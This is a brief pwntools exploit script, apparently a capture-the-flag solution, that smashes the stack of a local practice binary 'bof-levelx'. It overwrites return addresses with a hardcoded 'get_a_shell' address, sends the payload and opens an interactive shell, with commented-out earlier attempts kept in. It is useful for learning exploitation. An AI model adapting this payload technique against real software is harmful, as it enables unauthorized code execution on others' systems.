#!/usr/bin/env python

from pwn import *
p = process('./bof-levelx')
#p = process('./bof-level4')

context.terminal = ['tmux', 'splitw', '-h']

gdb.attach(p)

# buffer is at -0x80(%ebp)
# [ buffer size - 0x80 ] [ saved ebp ]
#   'A' * 0x80              'dddd'
# [ 'AAAA' + 'addr of get_a_shell' + 'A' * (0x80-8)
#target_ebp_value = p32(0xffffd3e8)

#addr_of_get_a_shell = p32(0x80484cb)

#buf = 'AAAA' + addr_of_get_a_shell + 'A' * (0x80-8) + target_ebp_value
#c = Core('./core')

#e = ELF('./bof-levelx')
#get_a_shell = e.symbols['get_a_shell']

#print(hex(get_a_shell))

#buf = "TESTINGTEXTCONTENTS"

#c = Core('./core')

#buffer_addr = c.stack.find(buf)
#print(hex(buffer_addr))

#buf = "aaaa" + p32(get_a_shell) + "aaaaaaaaaaaaABCDEFGH" + p32(buffer_addr)

print(p.recv())

addr = p32(0x8048530)

# [ 5 * get_a_shell ] [ b ] [ a ] [ 2 * get_a_shell ] [ ret ] [ 4 * get_a_shell ]
buf = addr*5 + "ABCDEFGH" + addr*2 + p32(0x804876b) + addr*4

p.sendline(buf)

p.interactive()
